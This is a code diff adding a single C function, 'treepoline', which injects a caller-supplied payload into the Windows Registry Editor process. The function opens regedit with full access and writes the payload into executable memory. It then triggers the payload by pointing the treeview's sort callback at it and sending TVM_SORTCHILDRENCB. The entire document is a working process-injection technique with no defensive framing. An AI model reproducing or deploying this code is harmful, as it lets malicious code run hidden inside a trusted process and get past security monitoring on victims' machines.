@@ -1,0 +1,44 @@
+VOID treepoline(LPVOID payload, DWORD payloadSize) {
+    HANDLE        hp;
+    DWORD         id;
+    HWND          wpw, tlv;
+    LPVOID        cs, ds, item;
+    SIZE_T        rd, wr;
+    TVSORTCB      tvs;
+    
+    // 1. get the treeview handle
+    wpw = FindWindow(L"RegEdit_RegEdit", NULL);
+    tlv = FindWindowEx(wpw, 0, L"SysTreeView32", 0);
+    
+    // 2. Obtain the process id and try to open process
+    GetWindowThreadProcessId(tlv, &id);
+    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
+
+    // 3. Allocate RWX memory and copy the payload there.
+    cs = VirtualAllocEx(hp, NULL, payloadSize,
+        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        
+    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
+    
+    // 4. Obtain the root item in tree list
+    item = (LPVOID)SendMessage(tlv, TVM_GETNEXTITEM, TVGN_ROOT, 0);
+
+    tvs.hParent     = item;
+    tvs.lpfnCompare = cs;
+    tvs.lParam      = 0;
+    
+    // 5. Allocate RW memory and copy the TVSORTCB structure
+    ds = VirtualAllocEx(hp, NULL, sizeof(TVSORTCB),
+        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+        
+    WriteProcessMemory(hp, ds, &tvs, sizeof(TVSORTCB), &wr);
+    
+    // 6. Trigger payload
+    SendMessage(tlv, TVM_SORTCHILDRENCB, 0, (LPARAM)ds);
+
+    // 7. Free memory and close process handle
+    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);
+    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
+    
+    CloseHandle(hp);
+}
